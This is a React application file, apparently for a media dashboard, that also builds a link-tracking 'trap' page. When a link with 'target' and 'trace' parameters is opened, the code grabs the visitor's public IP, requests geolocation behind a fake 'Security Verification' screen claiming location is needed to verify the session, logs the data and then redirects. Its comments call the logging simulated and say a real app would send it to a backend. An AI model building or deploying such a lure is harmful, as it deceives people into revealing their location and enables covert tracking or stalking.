
import React, { useState, useEffect } from 'react';
import Sidebar from './components/Sidebar';
import Dashboard from './components/Dashboard';
import GlobalPlayer from './components/GlobalPlayer';
import { PlayerProvider } from './services/playerContext';
import { ToastProvider } from './services/toastContext';
import { ShieldAlert, Loader } from 'lucide-react';

const App: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [activeTab, setActiveTab] = useState('dashboard');
  const [isTrap, setIsTrap] = useState(false);
  const [trapRedirect, setTrapRedirect] = useState('');

  // Intercept Tracked Links
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const target = params.get('target');
    const trace = params.get('trace');

    if (target && trace) {
        setIsTrap(true);
        setTrapRedirect(target);

        // Execute "Log" logic (Simulated)
        const logIntercept = async () => {
            console.log(`Intercepted trace ${trace}`);
            
            // 1. Get IP (Public API)
            try {
                // In a real app, this data would be POSTed to the backend
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                console.log("Captured IP:", ipData.ip);
            } catch(e) {}

            // 2. Request Geo (Requires user consent)
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    console.log("Captured Coords:", pos.coords);
                    redirect(target);
                },
                (err) => {
                    console.log("Geo Denied");
                    redirect(target);
                }
            );
        };

        logIntercept();
    }
  }, []);

  const redirect = (url: string) => {
      setTimeout(() => {
          window.location.href = url.startsWith('http') ? url : `https://${url}`;
      }, 2000);
  };

  if (isTrap) {
      return (
          <div className="h-screen w-screen bg-slate-950 flex flex-col items-center justify-center text-center p-6">
              <ShieldAlert size={64} className="text-red-500 mb-6 animate-pulse"/>
              <h1 className="text-2xl font-bold text-white mb-2">Security Verification</h1>
              <p className="text-slate-400 mb-8 max-w-md">
                  Please allow location access to verify your session identity. You will be redirected automatically.
              </p>
              <div className="flex items-center gap-2 text-slate-500 text-sm">
                  <Loader className="animate-spin" size={16}/> Verifying parameters...
              </div>
          </div>
      );
  }

  return (
    <ToastProvider>
      <PlayerProvider>
        <div className="flex h-screen w-screen bg-slate-950 overflow-hidden text-slate-100 font-sans">
          <Sidebar 
            isOpen={sidebarOpen} 
            onToggle={() => setSidebarOpen(!sidebarOpen)} 
            activeTab={activeTab}
            onTabChange={setActiveTab}
          />
          
          <main className={`
            flex-1 h-full relative transition-all duration-300 ease-in-out flex flex-col
            ${sidebarOpen ? 'md:ml-80' : 'md:ml-20'}
          `}>
            <Dashboard activeTab={activeTab} />
            <GlobalPlayer />
          </main>
        </div>
      </PlayerProvider>
    </ToastProvider>
  );
};

export default App;
